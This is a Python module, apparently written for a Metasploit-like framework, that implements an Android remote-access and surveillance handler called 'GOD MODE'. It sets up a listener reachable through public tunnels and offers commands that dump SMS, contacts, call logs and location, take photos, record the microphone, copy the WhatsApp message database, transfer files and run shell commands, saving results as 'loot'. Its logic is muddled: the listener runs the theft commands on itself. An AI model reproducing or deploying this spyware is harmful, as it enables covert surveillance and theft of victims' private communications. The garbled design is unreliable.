# modules/auxiliary/multi_handler.py
import os
import socket
import threading
import queue
import time
import subprocess
import json
import base64
import requests
import shlex
import re
from datetime import datetime
from typing import Dict, Any, Optional, List
from dataclasses import dataclass, field
from cryptography.fernet import Fernet
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from urllib.parse import urlparse

console = Console()

MODULE_INFO = {
    'name': 'GOD MODE Android Handler',
    'description': 'Ultimate Android post-exploitation: SMS, WhatsApp, Camera, Mic, Contacts, etc.',
    'author': 'Grok',
    'platform': 'multi',
    'arch': 'multi',
    'rank': 'Godlike',
    'dependencies': ['cryptography', 'requests']
}

OPTIONS = {
    'LHOST': {'description': 'Tunnel URL or IP', 'required': True, 'default': '0.0.0.0'},
    'LPORT': {'description': 'Port', 'required': True, 'default': 4444},
    'PAYLOAD': {'description': 'tcp/http/https', 'required': True, 'default': 'tcp'},
    'ENCRYPT': {'description': 'AES encryption', 'required': False, 'default': False},
    'KEY': {'description': 'Encryption key', 'required': False, 'default': ''},
    'TIMEOUT': {'description': 'Session timeout', 'required': False, 'default': 300},
    'LOGFILE': {'description': 'JSON log', 'required': False, 'default': ''},
    'TUNNEL_TYPE': {'description': 'none/ngrok/pinggy/serveo/cloudflare/tailscale', 'required': False, 'default': 'none'}
}

@dataclass
class Session:
    id: int
    conn: socket.socket
    addr: tuple
    payload_type: str
    platform: str = "unknown"
    start_time: datetime = field(default_factory=datetime.now)
    last_seen: datetime = field(default_factory=datetime.now)
    fernet: Optional[Fernet] = None
    thread: Optional[threading.Thread] = None

class MultiHandler:
    def __init__(self, options: Dict[str, Any]):
        self.options = options
        self.sessions: Dict[int, Session] = {}
        self.next_id = 1
        self.lock = threading.Lock()
        self.running = threading.Event()
        self.log_data: List[Dict[str, Any]] = []
        self.tunnel_process: Optional[subprocess.Popen] = None
        self.public_url = "unknown"
        self.local_ip = self._get_local_ip()

    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 1))
            return s.getsockname()[0]
        except:
            return "127.0.0.1"

    def _setup_tunnel(self) -> str:
        ttype = self.options['TUNNEL_TYPE'].lower()
        if ttype == 'none':
            self.public_url = f"{self.options['LHOST']}:{self.options['LPORT']}"
            return self.public_url

        cmd = f"{ttype} tcp {self.options['LPORT']}"
        console.print(f"[yellow]Starting tunnel: {cmd}[/yellow]")
        self.tunnel_process = subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        
        for _ in range(30):
            line = self.tunnel_process.stdout.readline()
            url = re.search(r'(tcp://|https?://)[\w.-]+:\d+', line)
            if url:
                self.public_url = url.group(0)
                console.print(f"[bold green]TUNNEL: {self.public_url}[/bold green]")
                break
            time.sleep(1)
        return self.public_url

    def _show_status(self):
        console.print(Panel(
            f"[bold cyan]ANDROID GOD MODE[/bold cyan]\n\n"
            f"[white]WAN:[/white] [yellow]{self.public_url}[/yellow]\n"
            f"[white]Use in payload: LHOST {self.public_url.split('://')[-1]}[/white]\n\n"
            f"[bold]Commands: sms | contacts | camera front/back | mic_record 10 | steal_whatsapp | dump_calllog[/bold]",
            title="Handler", border_style="bright_blue"
        ))

    def log_session(self, action: str, sess: Optional[Session] = None):
        entry = {"time": datetime.now().isoformat(), "action": action, "id": sess.id if sess else None, "wan": self.public_url}
        self.log_data.append(entry)
        if self.options['LOGFILE']:
            try:
                with open(self.options['LOGFILE'], 'a') as f:
                    f.write(json.dumps(entry) + '\n')
            except: pass

    def add_session(self, conn: socket.socket, addr: tuple):
        with self.lock:
            sess = Session(id=self.next_id, conn=conn, addr=addr, payload_type=self.options['PAYLOAD'])
            self.next_id += 1
            self.sessions[sess.id] = sess

            if self.options['ENCRYPT']:
                key = self.options['KEY'] or base64.urlsafe_b64encode(os.urandom(32)).decode()
                if not self.options['KEY']: console.print(f"[green]Key: {key}[/green]")
                sess.fernet = Fernet(base64.urlsafe_b64encode(key.encode().ljust(32)[:32]))

            sess.thread = threading.Thread(target=self._handle_client, args=(sess,), daemon=True)
            sess.thread.start()
            self.log_session("connect", sess)
            console.print(f"[bold green]Session {sess.id} ← {addr[0]} (Android)[/bold green]")

    def remove_session(self, sid: int):
        with self.lock:
            if sid in self.sessions:
                sess = self.sessions.pop(sid)
                try: sess.conn.close()
                except: pass
                self.log_session("disconnect", sess)
                console.print(f"[bold red]Session {sid} died[/bold red]")

    def list_sessions(self):
        if not self.sessions:
            console.print("[yellow]No sessions[/yellow]")
            return
        table = Table(title="Android Sessions")
        table.add_column("ID", style="cyan")
        table.add_column("IP", style="white")
        table.add_column("Uptime", style="magenta")
        with self.lock:
            for s in self.sessions.values():
                up = str(datetime.now() - s.start_time).split('.')[0]
                table.add_row(str(s.id), f"{s.addr[0]}:{s.addr[1]}", up)
        console.print(table)

    def _handle_client(self, sess: Session):
        timeout = int(self.options['TIMEOUT'])
        last = time.time()
        while self.running.is_set():
            try:
                sess.conn.settimeout(1)
                data = sess.conn.recv(8192)
                if not data: break
                if sess.fernet:
                    try: data = sess.fernet.decrypt(data)
                    except: break
                cmd = data.decode().strip()
                if cmd == "heartbeat":
                    last = time.time()
                    continue
                if time.time() - last > timeout: break
                resp = self._execute_command(cmd, sess)
                if sess.fernet: resp = sess.fernet.encrypt(resp.encode())
                sess.conn.send(resp)
            except: break
        self.remove_session(sess.id)

    def _execute_command(self, cmd: str, sess: Session) -> str:
        parts = cmd.split(maxsplit=1)
        op = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ""

        try:
            if op == "sms":
                return self._get_sms()
            elif op == "contacts":
                return self._dump_contacts()
            elif op == "gallery":
                return self._get_gallery(arg or "/sdcard/DCIM")
            elif op == "location":
                return self._get_location()
            elif op == "camera":
                cam = "front" if "front" in arg else "back"
                return self._take_photo(cam)
            elif op == "mic_record" and arg.isdigit():
                return self._record_mic(int(arg))
            elif op == "wallpaper" and arg:
                return self._set_wallpaper(arg)
            elif op == "download" and arg:
                return self._download_file(arg)
            elif op == "upload" and " " in arg:
                local, remote = arg.split(maxsplit=1)
                return self._upload_file(local, remote)
            elif op == "steal_whatsapp":
                return self._steal_whatsapp()
            elif op == "dump_calllog":
                return self._dump_calllog()
            elif op == "sysinfo":
                return json.dumps({
                    "platform": "Android",
                    "model": subprocess.getoutput("getprop ro.product.model"),
                    "wan": self.public_url
                })
            elif op == "shell" and arg:
                result = subprocess.check_output(arg, shell=True, timeout=20)
                return result.decode(errors='ignore')
            else:
                return ("Commands:\n"
                        "  sms\n  contacts\n  gallery [path]\n  location\n"
                        "  camera front / camera back\n  mic_record 10\n"
                        "  wallpaper <path>\n  download <path>\n  upload <local> <remote>\n"
                        "  steal_whatsapp\n  dump_calllog\n  shell <cmd>\n  sysinfo")
        except Exception as e:
            return f"Error: {e}"

    def _get_sms(self) -> str:
        result = subprocess.check_output(
            'content query --uri content://sms/ --projection address:body:date:type',
            shell=True, timeout=15
        ).decode(errors='ignore')
        sms = []
        for line in result.strip().split('\n'):
            if not line: continue
            parts = [p.split('=')[1] for p in line.split(', ')[:4]]
            sms.append({
                "from": parts[0],
                "body": parts[1],
                "date": datetime.fromtimestamp(int(parts[2])/1000).strftime('%Y-%m-%d %H:%M'),
                "type": "INBOX" if parts[3] == "1" else "SENT"
            })
        return json.dumps(sms, indent=2)

    def _dump_contacts(self) -> str:
        result = subprocess.check_output(
            'content query --uri content://com.android.contacts/data/phones --projection display_name:phones_number',
            shell=True, timeout=10
        ).decode(errors='ignore')
        contacts = []
        for line in result.strip().split('\n'):
            if 'display_name=' in line:
                name = line.split('display_name=')[1].split(',')[0]
                phone = line.split('phones_number=')[1].split(',')[0]
                contacts.append({"name": name, "phone": phone})
        return json.dumps(contacts, indent=2)

    def _get_gallery(self, path: str) -> str:
        files = []
        for f in os.listdir(path):
            full = os.path.join(path, f)
            if os.path.isfile(full):
                files.append({"name": f, "size": os.path.getsize(full), "path": full})
        return json.dumps(files, indent=2)

    def _get_location(self) -> str:
        loc = subprocess.check_output('dumpsys location | grep -A 5 "Location[0]"', shell=True, timeout=10).decode()
        return loc or "Location off"

    def _take_photo(self, camera: str) -> str:
        cam_id = "0" if camera == "back" else "1"
        path = "/sdcard/DCIM/capture.jpg"
        subprocess.run(f"termux-camera-photo -c {cam_id} {path}", shell=True, timeout=15)
        if os.path.exists(path):
            with open(path, 'rb') as f:
                return f"PHOTO:{base64.b64encode(f.read()).decode()}"
        return "Camera failed"

    def _record_mic(self, seconds: int) -> str:
        path = "/sdcard/Download/recording.wav"
        subprocess.run(f"termux-microphone-record -f {path} -l {seconds}", shell=True, timeout=seconds+5)
        if os.path.exists(path):
            with open(path, 'rb') as f:
                return f"AUDIO:{base64.b64encode(f.read()).decode()}"
        return "Mic failed"

    def _set_wallpaper(self, path: str) -> str:
        subprocess.run(f"am startservice -n com.termux/.app.TermuxService -a com.termux.WALLPAPER --es path {path}", shell=True)
        return f"Wallpaper set: {path}"

    def _download_file(self, path: str) -> str:
        if not os.path.exists(path): return "File not found"
        with open(path, 'rb') as f:
            return f"FILE:{os.path.basename(path)}:{base64.b64encode(f.read()).decode()}"

    def _upload_file(self, local: str, remote: str) -> str:
        if not os.path.exists(local): return "Local file not found"
        with open(local, 'rb') as f:
            data = base64.b64encode(f.read()).decode()
        subprocess.run(f"echo '{data}' | base64 -d > {remote}", shell=True)
        return f"Uploaded to {remote}"

    def _steal_whatsapp(self) -> str:
        wa_db = "/data/data/com.whatsapp/databases/msgstore.db"
        if os.path.exists(wa_db):
            with open(wa_db, 'rb') as f:
                return f"WA_DB:{base64.b64encode(f.read()).decode()}"
        return "WhatsApp not installed or no root"

    def _dump_calllog(self) -> str:
        result = subprocess.check_output(
            'content query --uri content://call_log/calls --projection name:number:date:type',
            shell=True, timeout=10
        ).decode(errors='ignore')
        logs = []
        for line in result.strip().split('\n'):
            if not line: continue
            parts = [p.split('=')[1] for p in line.split(', ')[:4]]
            logs.append({
                "name": parts[0],
                "number": parts[1],
                "date": datetime.fromtimestamp(int(parts[2])/1000).strftime('%Y-%m-%d %H:%M'),
                "type": ["", "INCOMING", "OUTGOING", "MISSED"][int(parts[3])]
            })
        return json.dumps(logs, indent=2)

    def start_listener(self):
        self.public_url = self._setup_tunnel()
        self._show_status()
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', int(self.options['LPORT'])))
        server.listen(10)
        console.print(f"[blue]Listening on 0.0.0.0:{self.options['LPORT']}[/blue]")
        self.running.set()
        while self.running.is_set():
            try:
                conn, addr = server.accept()
                self.add_session(conn, addr)
            except: continue

    def stop(self):
        self.running.clear()
        if self.tunnel_process: self.tunnel_process.terminate()
        with self.lock:
            for s in list(self.sessions.values()):
                try: s.conn.close()
                except: pass
            self.sessions.clear()
        console.print("[bold red]GOD MODE OFF[/bold red]")

def run(session: Dict[str, Any], options: Dict[str, Any]):
    opts = {k: options.get(k, v['default']) for k, v in OPTIONS.items()}
    opts['ENCRYPT'] = str(opts['ENCRYPT']).lower() == 'true'
    handler = MultiHandler(opts)
    threading.Thread(target=handler.start_listener, daemon=True).start()
    console.print("[bold cyan]ANDROID GOD MODE ON[/bold cyan]")
    try:
        while handler.running.is_set():
            cmd = input("god> ").strip()
            if cmd == "sessions": handler.list_sessions()
            elif cmd.startswith("interact "):
                sid = int(cmd.split()[1])
                sess = handler.sessions.get(sid)
                if sess: _interact(sess, handler)
            elif cmd == "stop": handler.stop(); break
    except: handler.stop()

def _interact(sess: Session, h: MultiHandler):
    console.print(f"[bold magenta]Session {sess.id}[/bold magenta]")
    while sess.id in h.sessions:
        try:
            cmd = input(f"[{sess.id}]> ").strip()
            if cmd in ["exit", "back"]: break
            if sess.fernet: cmd = sess.fernet.encrypt(cmd.encode())
            else: cmd = cmd.encode()
            sess.conn.send(cmd)
            sess.conn.settimeout(15)
            r = sess.conn.recv(16384)
            if sess.fernet: r = sess.fernet.decrypt(r)
            output = r.decode(errors='ignore')
            if output.startswith("FILE:") or output.startswith("PHOTO:") or output.startswith("AUDIO:") or output.startswith("WA_DB:"):
                prefix, name, data = output.split(":", 2)
                path = f"loot_{sess.id}_{name}"
                with open(path, "wb") as f:
                    f.write(base64.b64decode(data))
                console.print(f"[green]Saved: {path}[/green]")
            else:
                console.print(output)
        except: break
